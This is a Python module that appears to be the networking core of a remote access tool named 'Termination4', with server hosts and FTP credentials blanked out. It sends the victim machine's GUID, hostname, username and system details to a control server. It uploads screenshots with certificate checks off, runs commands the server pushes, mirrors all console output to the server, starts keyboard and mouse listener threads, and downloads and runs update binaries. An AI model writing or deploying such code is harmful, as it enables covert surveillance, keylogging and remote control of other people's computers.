from TLib import *
from TLib.T_imports import *
from . import Thread_TWNTWork


class TWNetworkTransit(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination'):
        self.master=master
        #T_TWNetworkIO.TWNetworkIO.__init__(self)
        self.__init_values__()
        self.ServerLoop()
    def __init_values__(self):
        self.GodKeys=self.master.GodKeys
        self.__version__=self.master.__version__
        self.TFile="/T.json"
        self.PermanentAddress="--------------------------"
        self.PermanentAddressTFile=os.path.join(self.PermanentAddress, self.TFile)
        self.FTPHost="-----------------"
        self.FTPPort=114514
        self.FTPUserName="------------------------------"
        self.FTPUserPasswd="------------------------------------"
        self.desc="TWNetworkTransit"
        self.ssl_context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        self.ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
        self.ssl_context.maximum_version = ssl.TLSVersion.TLSv1_2
        class SHTTPAdapter(requests.adapters.HTTPAdapter):
            def __init__(self, ssl_context=None, **kwargs):
                self.ssl_context = ssl_context
                super().__init__(**kwargs)
            def init_poolmanager(self, *args, **kwargs):
                if self.ssl_context:
                    kwargs['ssl_context'] = self.ssl_context
                return super().init_poolmanager(*args, **kwargs)
        self.http_session = requests.Session()
        #self.http_session.verify = True
        self.http_session.mount('https://', SHTTPAdapter(ssl_context=self.ssl_context))
        self.Socket=socketio.Client(
            reconnection=True,
            reconnection_attempts=5,
            reconnection_delay=1000,
            #engineio_logger=True, logger=True,
            #http_session=self.http_session,
        )
        self.ComputerINFO=T_ComputerInFo.GetWindowsSystemINFO() # Spend Too Many Time
        self.PCMachineGUID=T_ComputerInFo.GetPCMachineGUID().replace("-", "")
        self.PLT=None
        self.Thread_RealTimeScreen=None
        self.Level=20
        self.Toast=Thread_TWNTWork.TWNToast(self.master, self)
    def _RequestsGetTFile(self):
        return self.get(self.PermanentAddressTFile)
    def _FTPGetTFile(self):
        try:
            self.FTP=ftplib.FTP()
            self.FTP.connect(self.FTPHost, self.FTPPort)
            self.FTP.login(self.FTPUserName, self.FTPUserPasswd)
            self.FTP.voidcmd('TYPE I')
            s=b""
            with self.FTP.transfercmd(f"RETR {self.TFile}", None) as conn:
                while data := conn.recv(1024):
                    s+=data
                if ftplib._SSLSocket is not None and isinstance(conn, ftplib._SSLSocket): conn.unwrap()
            self.FTP.voidresp()
            return s
        except:
            return False
    def _GetTFile(self):
        if (data:=self._RequestsGetTFile()) and data.status_code == 200:
            return data.content
        elif (data:=self._FTPGetTFile()) and data:
            return data
        else:
            return False
    def _ConnectServer(self):
        self.ECSCode=0
        while True:
            try:
                TFile=json.loads((self._GetTFile()).decode("UTF-8"))
                self.ECSCode=0
            except:
                if self.ECSCode <= 10:
                    self.ECSCode+=1
                else:
                    return self.PATFile
            else: return TFile
            time.sleep(1)
    def ServerLoop(self):
        print(f"Server Loop Start.")
        self.SocketIOregirst(self.Socket)
        #self.S_CallBack()
        self.S_Process()
        self.ECode=0
        self.Updating=False
        while not self.ShouldStop():
            if not self.Socket.connected:
                if self.ECode <= 10: print("Start To Try Connect")
                self.PATFile={"X": "https", "Host":"---------------------------------------", "Port":443}
                if self.ECode != 0 and self.ECode % 2 != 0:
                    print("Getting PATFile...")
                    self.PATFile=self._ConnectServer()
                try:
                    if self.ECode <= 10:
                        print(f"Try To Connect [{self.PATFile['X']}://{self.PATFile['Host']}:{self.PATFile['Port']}]")
                    self.Socket.connect(f"{self.PATFile['X']}://{self.PATFile['Host']}:{self.PATFile['Port']}", headers=
                                        {"data": self.GodKeys.encrypt_16(
                                            {"PCMachineGUID": self.PCMachineGUID,
                                            "PCVersion": self.__version__,
                                            "PCompilation": str(self.master.Version.version["Compilation"]["Runs"]),
                                            "PCName": socket.gethostname(),
                                            "PCreateUserName": os.getenv('USERNAME'),
                                            "PCSystemINFO": json.dumps(self.ComputerINFO),
                                            }
                                        )},
                                        wait_timeout=120,
                                        namespaces=["/Termination4SocketIOSpace"],
                                        transports=['websocket'],
                                        socketio_path="/socket.io")
                    print("Connected")
                    print("Connected2Status" if self.Socket.connected else "!Connected2Status")
                    if self.Socket.connected and self.ECode == 0:
                        try:
                            ssb=self.master.WindowsScreenCapture.CaptureAndCompressScreenshot(self.Level)
                            if ssb:
                                r=requests.post(f"{self.PATFile['X']}://{self.PATFile['Host']}/T4/TAPI/cover.api", files={"screen": (".gkbd", self.GodKeys.encrypt(ssb["ImageBytes"]))}, data={"PCMachineGUID": self.PCMachineGUID}, verify=False)
                                if int(r.status_code) != 200: print(f"Cover Update State: Code: {r.status_code} Text: {r.text}")
                        except: print("Cover Update Error")
                    self.ECode=0
                except:
                    if self.ECode <= 100:
                        print(f"Count [{self.ECode}] Error To Try Connect", traceback.format_exc())
                    if self.ECode % 100 == 0:
                        print(f"Try to Check Update")
                        try:
                            r=requests.get(f"{self.PATFile['X']}://{self.PATFile['Host']}/T4/TAPI/SHA256.api", verify=False, timeout=10)
                            if int(r.status_code) == 200:
                                if hasattr(self.master, "__file_sha256__") and self.master.tpll.IsSha256(r.text) and self.master.__file_sha256__ != r.text and not self.Updating and self.master.GetWorkMod() == "exe":
                                    UBUF=Thread_TWNTWork.TWNEUpdateApp(self.master, {"Command": f"{self.PATFile['X']}://{self.PATFile['Host']}/FTP/Termination.bin"})
                                    self.master.TProcessManager.AddThread(UBUF)
                                    UBUF.start()
                                    self.Updating=True
                        except:
                            if self.ECode <= 10:
                                print(f"TWNT Update Termination Error")
                                traceback.print_exc()
                                return
                    self.ECode+=1
            time.sleep(3)
        print("ShouldStop, Disconnect")
        self.Socket.disconnect()
    def SocketIOregirst(self, Socket: socketio.Client):
        Socket.on("connect", self.S_Connect, namespace="/Termination4SocketIOSpace")
        Socket.on("disconnect", self.S_Disconnect, namespace="/Termination4SocketIOSpace")
        Socket.on(self.PCMachineGUID+"Command", self.S_Command, namespace="/Termination4SocketIOSpace")
        TWNT=self
        class SocketWriter:
            def __init__(self, SocketIO: socketio.Client, PCMachineGUID: str, filename):
                self.SocketIO = SocketIO
                self.PCMachineGUID = PCMachineGUID
                self.filename=filename
                self.__pid__=os.getpid()
            def write(self, s):
                if (f:=open(self.filename, "a", encoding="UTF-8")): f.write(s if s.replace("\n", "").replace("\t", "").replace(" ", "") in ('^', '') else f"[{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}] [{self.__pid__}] {s}")
                if self.SocketIO.connected:
                    self.SocketIO.emit("T4Message", TWNT.GodKeys.encrypt({"PCMachineGUID": self.PCMachineGUID, "Message": s if s.replace("\n", "").replace("\t", "").replace(" ", "") in ('^', '') else f"[{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}] [{self.__pid__}] {s}"}), namespace="/Termination4SocketIOSpace")
            def flush(self):
                if (f:=open(self.filename, "a", encoding="UTF-8")): f.flush()
        sys.stdout=sys.stderr=self.SocketWriter=SocketWriter(Socket, self.PCMachineGUID, self.master.__log_path__)
    def S_Connect(self):
        print("Socket Connect.")
    def S_Disconnect(self, msg=None):
        print(f"Socket Disconnect.\nMsg: [\n{msg}\n]")
    def S_CallBack(self):
        def start_callback(n):
            self.ProcessSynchronous()
            #print(f"Thread [{n}] Start")
        def end_callback(n):
            self.ProcessSynchronous()
            #print(f"Thread [{n}] End")
        self.master.TProcessManager.add_start_callback(start_callback)
        self.master.TProcessManager.add_end_callback(end_callback)
    def S_Command(self, data):
        CBUF=Thread_TWNTWork.TWNETProcess(self.master, self, data)
        self.master.TProcessManager.AddThread(CBUF)
        CBUF.start()
    def S_Process(self):
        self.Thread_MonitorWorker=Thread_TWNTWork.MonitorWorker(self.master, self)
        self.Thread_ListenKMWorker=Thread_TWNTWork.ListenKMWorker(self.master, self)
        self.Thread_TWNESynchronousTProcess=Thread_TWNTWork.TWNESynchronousTProcess(self)
        self.Thread_TWNTProcessSynchronousWorker=Thread_TWNTWork.TWNTProcessSynchronousWorker(self.master, self)
        self.Thread_TWNTCoverScreen=Thread_TWNTWork.TWNTCoverScreen(self.master, self)
        self.master.TProcessManager.AddThread(self.Thread_MonitorWorker)
        self.master.TProcessManager.AddThread(self.Thread_ListenKMWorker)
        self.master.TProcessManager.AddThread(self.Thread_TWNESynchronousTProcess)
        self.master.TProcessManager.AddThread(self.Thread_TWNTProcessSynchronousWorker)
        self.master.TProcessManager.AddThread(self.Thread_TWNTCoverScreen)
        self.Thread_MonitorWorker.start()
        self.Thread_ListenKMWorker.start()
        self.Thread_TWNESynchronousTProcess.start()
        self.Thread_TWNTProcessSynchronousWorker.start()
        self.Thread_TWNTCoverScreen.start()
        self.master.Thread_MonitorWorker=self.Thread_MonitorWorker
        self.master.Thread_ListenKMWorker=self.Thread_ListenKMWorker
        self.master.Thread_TWNESynchronousTProcess=self.Thread_TWNESynchronousTProcess
        self.master.Thread_TWNTProcessSynchronousWorker=self.Thread_TWNTProcessSynchronousWorker
        self.master.Thread_TWNTCoverScreen=self.Thread_TWNTCoverScreen